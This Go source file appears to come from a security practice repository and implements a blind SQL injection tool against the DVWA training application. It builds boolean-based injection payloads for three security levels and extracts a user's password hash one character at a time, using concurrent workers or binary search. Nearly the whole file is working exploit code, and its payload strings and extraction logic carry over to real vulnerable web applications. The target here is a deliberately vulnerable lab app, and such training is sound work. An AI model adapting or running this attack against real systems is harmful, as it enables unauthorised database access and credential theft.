package sqli

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sync"
	"time"

	"github.com/jace-ys/cybersec/dvwa"
)

var (
	charset       = []byte("0123456789abcdef")
	blindResultRe = regexp.MustCompile(`<pre>(.*)</pre>`)
)

func RunBlind(client *dvwa.Client, userID, mode string, workers int) error {
	guesser := NewBlindSQLGuesser(client, userID)
	injector := NewBlindSQLInjector(guesser, workers)

	start := time.Now()
	err := injector.Exploit(mode)
	if err != nil {
		return err
	}
	duration := time.Since(start)

	fmt.Printf("Password of user with ID %s: %s [%d guesses in %v]\n", userID, string(injector.password), injector.guesses, duration)
	return nil
}

type BlindSQLInjector struct {
	password []byte
	guesser  Guesser
	guesses  int
	workers  int
	mu       sync.Mutex
	wg       sync.WaitGroup
}

func NewBlindSQLInjector(guesser Guesser, workers int) *BlindSQLInjector {
	return &BlindSQLInjector{
		password: make([]byte, 32),
		guesser:  guesser,
		workers:  workers,
	}
}

type BlindAttempt struct {
	position int
	guess    byte
}

func (i *BlindSQLInjector) Exploit(mode string) error {
	switch mode {
	case "concurrent":
		attempts := make(chan BlindAttempt)

		for w := 0; w < i.workers; w++ {
			go func() {
				if err := i.exploitConcurrent(attempts); err != nil {
					fmt.Printf("dvwa: error: sqli-blind: %s\n", err)
					os.Exit(1)
				}
			}()
		}

		for pos := range i.password {
			for idx := range charset {
				i.wg.Add(1)
				attempts <- BlindAttempt{position: pos, guess: charset[idx]}
				i.guesses++
			}
		}

		i.wg.Wait()
		close(attempts)

		for pos, value := range i.password {
			if value == 0 {
				return fmt.Errorf("no possible value for password at position %d", pos)
			}
		}

	case "binary":
		for pos := range i.password {
			answer, err := i.exploitBinary(charset, pos)
			if err != nil {
				return err
			}

			i.password[pos] = answer
		}

	default:
		return fmt.Errorf("invalid mode for exploit")
	}

	return nil
}

func (i *BlindSQLInjector) exploitConcurrent(attempts <-chan BlindAttempt) error {
	for attempt := range attempts {
		correct, err := i.guesser.GuessEqual(attempt.position, attempt.guess)
		if err != nil {
			return err
		}

		if correct {
			i.mu.Lock()
			i.password[attempt.position] = attempt.guess
			i.mu.Unlock()
		}

		i.wg.Done()
	}

	return nil
}

func (i *BlindSQLInjector) exploitBinary(possible []byte, position int) (byte, error) {
	i.guesses++
	mid := len(possible) / 2

	if len(possible) == 0 {
		return 0, fmt.Errorf("no possible value for password at position %d", position)
	}

	equal, err := i.guesser.GuessEqual(position, possible[mid])
	if err != nil {
		return 0, err
	}

	more, err := i.guesser.GuessGreater(position, possible[mid])
	if err != nil {
		return 0, err
	}

	switch {
	case equal:
		return possible[mid], nil
	case more:
		return i.exploitBinary(possible[mid+1:], position)
	default:
		return i.exploitBinary(possible[:mid], position)
	}
}

type Guesser interface {
	GuessEqual(position int, char byte) (bool, error)
	GuessGreater(position int, char byte) (bool, error)
}

type BlindSQLGuesser struct {
	client   *dvwa.Client
	security string
	userID   string
}

func NewBlindSQLGuesser(client *dvwa.Client, userID string) *BlindSQLGuesser {
	return &BlindSQLGuesser{
		client: client,
		userID: userID,
	}
}

func (g *BlindSQLGuesser) GuessEqual(position int, char byte) (bool, error) {
	return g.guess(position, char, "=")
}

func (g *BlindSQLGuesser) GuessGreater(position int, char byte) (bool, error) {
	return g.guess(position, char, ">")
}

func (g *BlindSQLGuesser) guess(position int, char byte, op string) (bool, error) {
	var resp *http.Response
	var err error

	switch g.client.Security {
	case "low":
		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/?%s", g.client.Addr, data.Encode()))
		if err != nil {
			return false, err
		}
	case "medium":
		query := fmt.Sprintf("7 OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.client.Addr), data)
		if err != nil {
			return false, err
		}
	case "high":
		query := fmt.Sprintf("7' OR (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id = %s), %d, 1))) %s %d#", g.userID, position+1, op, char)
		data := url.Values{
			"id":     {query},
			"Submit": {"Submit"},
		}

		resp, err = g.client.PostForm(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/cookie-input.php", g.client.Addr), data)
		if err != nil {
			return false, err
		}

		resp, err = g.client.Get(fmt.Sprintf("http://%s/vulnerabilities/sqli_blind/", g.client.Addr))
		if err != nil {
			return false, err
		}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	matches := blindResultRe.FindSubmatch(body)
	if len(matches) < 2 {
		return false, fmt.Errorf("could not get exploit result")
	}
	result := string(matches[1])

	switch result {
	case "User ID exists in the database.":
		return true, nil
	case "User ID is MISSING from the database.":
		return false, nil
	default:
		return false, fmt.Errorf("unexpected exploit result: %s", result)
	}
}

type FakeGuesser struct {
	answer string
}

func NewFakeGuesser() *FakeGuesser {
	rand.Seed(time.Now().UnixNano())

	answer := make([]byte, 32)
	for i := range answer {
		answer[i] = charset[rand.Intn(len(charset))]
	}

	return &FakeGuesser{
		answer: string(answer),
	}
}

func (g *FakeGuesser) GuessEqual(position int, char byte) (bool, error) {
	time.Sleep(10 * time.Millisecond)
	return g.answer[position] == char, nil
}

func (g *FakeGuesser) GuessGreater(position int, char byte) (bool, error) {
	time.Sleep(10 * time.Millisecond)
	return g.answer[position] > char, nil
}
